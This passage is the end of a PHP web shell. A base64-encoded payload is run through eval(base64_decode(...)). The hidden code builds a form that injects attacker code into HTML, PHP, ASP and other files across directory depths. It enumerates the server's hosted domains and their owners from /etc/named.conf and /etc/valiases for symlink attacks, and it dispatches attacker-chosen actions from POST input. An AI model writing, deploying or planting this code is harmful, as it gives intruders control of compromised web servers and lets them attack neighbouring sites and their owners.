W1lIiB2YWx1ZT0iKiIvPiZuYnNwOyZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBzdHlsZT0id2lkdGg6IDEwMHB4OyIgbmFtZT0idHlwZSIgY2xhc3M9ImJveCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJodG1sIj5IVE1MPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJodG0iPkhUTTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0icGhwIiBzZWxlY3RlZD0ic2VsZWN0ZWQiPlBIUDwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iYXNwIj5BU1A8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9ImFzcHgiPkFTUFg8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9InhtbCI+WE1MPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJ0eHQiPlRYVDwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD48L3RkPgogICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRpdGxlIj5Db2RlIEluamVjdCBEZXB0aCA6IDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZGVwdGhbXSIgdmFsdWU9IjAiIGNoZWNrZWQ9ImNoZWNrZWQiLz4mbmJzcDswJm5ic3A7Jm5ic3A7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9ImRlcHRoW10iIHZhbHVlPSIxIi8+Jm5ic3A7MSZuYnNwOyZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJkZXB0aFtdIiB2YWx1ZT0iMiIvPiZuYnNwOzImbmJzcDsmbmJzcDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZGVwdGhbXSIgdmFsdWU9IjMiLz4mbmJzcDszCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPC90cj4gICAgICAgIAogICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjIiPjx0ZXh0YXJlYSBuYW1lPSJjb2RlIiBjb2xzPSI3MCIgcm93cz0iMTAiIGNsYXNzPSJib3giPjwvdGV4dGFyZWE+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjIiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJJbmplY3RvciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjIiB2YWx1ZT0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuICciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icDEiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icDIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2hhcnNldCIgdmFsdWU9IicgLiAoaXNzZXQoJF9QT1NUWydjaGFyc2V0J10pID8gJF9QT1NUWydjaGFyc2V0J10gOiAnJykgLiAnIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBzdHlsZT0icGFkZGluZyA6NXB4OyB3aWR0aDoxMDBweDsiIG5hbWU9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iSW5qZWN0Ii8+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90YWJsZT4KICAgICAgICA8L2Zvcm0+JzsKICAgIH0KICAgIGVjaG8gJzwvZGl2Pic7CiAgICBwcmludEZvb3RlcigpOwp9CgoKZnVuY3Rpb24gYWN0aW9uRG9tYWluKCkKewogICAgcHJpbnRIZWFkZXIoKTsKICAgIAogICAgZWNobyAnPGgxPkxvY2FsIERvbWFpbnM8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4nOwogICAgJGZpbGUgICAgICAgID0gQGltcGxvZGUoQGZpbGUoIi9ldGMvbmFtZWQuY29uZiIpKTsKICAgICREb21haW5fcGF0aCA9ICIvdmFyL25hbWVkIjsKICAgIAogICAgaWYgKCEkZmlsZSkgewogICAgICAgICRkb21haW5zID0gc2NhbmRpcigkRG9tYWluX3BhdGgpOwogICAgICAgICRjb3VudCAgID0gMTsKICAgICAgICAkZGMgICAgICA9IDA7CiAgICAgICAgZWNobyAiPHRhYmxlIGFsaWduPWNlbnRlciBib3JkZXI9MSB3aWR0aD01OSUgY2VsbHBhZGRpbmc9NT4KPHRyPjx0ZCBjb2xzcGFuPTI+VGhlcmUgYXJlIDogKCA8Yj4iIC4gY291bnQoJGRvbWFpbnMpIC4gIjwvYj4gKSBEb21haW5zIGluIHRoaXMgU2V2ZXIuQ2FuJ3QgcmVhZCBuYW1lZC5jb2YgLkRvbWFpbnMgYXJlIGJ5cGFzc2VkIGFjdHVhbGx5LHlvdSB3aWxsIGZhY2UgcHJvYmxlbSBpbiBzeW1saW5rLiA8L3RkPjwvdHI+Cjx0cj48dGQ+Tm88L3RkPjx0ZD5Eb21haW48L3RkPjx0ZD5Vc2VyPC90ZD48L3RyPiI7CiAgICAgICAgZm9yZWFjaCAoJGRvbWFpbnMgYXMgJiRkb21haW4pIHsKICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGRvbWFpbiwgIi5kYiIpKSB7CiAgICAgICAgICAgICAgICAkZG9tYWluID0gc3RyX3JlcGxhY2UoJy5kYicsICcnLCAkZG9tYWluKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChzdHJsZW4oJGRvbWFpbikgPiA2KSB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVjaG8gIjx0cj48dGQ+IiAuICRjb3VudCsrIC4gIjwvdGQ+PHRkPjxhIGhyZWY9J2h0dHA6Ly8iIC4gJGRvbWFpbiAuICInIHRhcmdldD0nX2JsYW5rJz4iIC4gJGRvbWFpbiAuICI8L2E+PC90ZD48dGQ+VXNlcjwvdGQ+PC90cj4iOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgZWNobyAiPC90YWJsZT4iOwogICAgfSBlbHNlIHsKICAgICAgICAkY291bnQgPSAxOwogICAgICAgIHByZWdfbWF0Y2hfYWxsKCIjbmFtZWQvKC4qPykuZGIjIiwgJGZpbGUsICRyKTsKICAgICAgICAkZG9tYWlucyA9IGFycmF5X3VuaXF1ZSgkclsxXSk7CiAgICAgICAgZWNobyAiPHRhYmxlIGFsaWduPWNlbnRlciBib3JkZXI9MSB3aWR0aD01OSUgY2VsbHBhZGRpbmc9NT4KPHRyPjx0ZCBjb2xzcGFuPTI+IFRoZXJlIGFyZSAgKCA8Yj4iIC4gY291bnQoJGRvbWFpbnMpIC4gIjwvYj4gKSBEb21haW5zIGluIHRoaXMgU2V2ZXIuSSB0aGluayB5b3UgaGF2ZSBnb3Qgc29tZXRoaW5nIHRoaXMgdGltZSB5ZWFoISEhLjwvdGQ+PC90cj4KPHRyPjx0ZD5ObzwvdGQ+PHRkPkRvbWFpbjwvdGQ+PHRkPlVzZXI8L3RkPjwvdHI+IjsKICAgICAgICBmb3JlYWNoICgkZG9tYWlucyBhcyAkZG9tYWluKSB7CiAgICAgICAgICAgIAogICAgICAgICAgICAkdXNlciA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIiAuICRkb21haW4pKTsKICAgICAgICAgICAgZWNobyAiPHRyPjx0ZD4iIC4gJGNvdW50KysgLiAiPC90ZD48dGQ+PGEgaHJlZj0naHR0cDovLyIgLiAkZG9tYWluIC4gIicgdGFyZ2V0PSdfYmxhbmsnPiIgLiAkZG9tYWluIC4gIjwvYT48L3RkPjx0ZD4iIC4gJHVzZXJbJ25hbWUnXSAuICI8L3RkPjwvdHI+IjsKICAgICAgICB9CiAgICB9CiAgICAKICAgIHByaW50Rm9vdGVyKCk7Cn0KCmlmIChlbXB0eSgkX1BPU1RbJ2EnXSkpCiAgICBpZiAoaXNzZXQoJGRlZmF1bHRfYWN0aW9uKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2FjdGlvbicgLiAkZGVmYXVsdF9hY3Rpb24pKQogICAgICAgICRfUE9TVFsnYSddID0gJGRlZmF1bHRfYWN0aW9uOwogICAgZWxzZQogICAgICAgICRfUE9TVFsnYSddID0gJ1NlY0luZm8nOwppZiAoIWVtcHR5KCRfUE9TVFsnYSddKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2FjdGlvbicgLiAkX1BPU1RbJ2EnXSkpCiAgICBjYWxsX3VzZXJfZnVuYygnYWN0aW9uJyAuICRfUE9TVFsnYSddKTsKPz4=";
eval("?>".(base64_decode($smevk)));
?>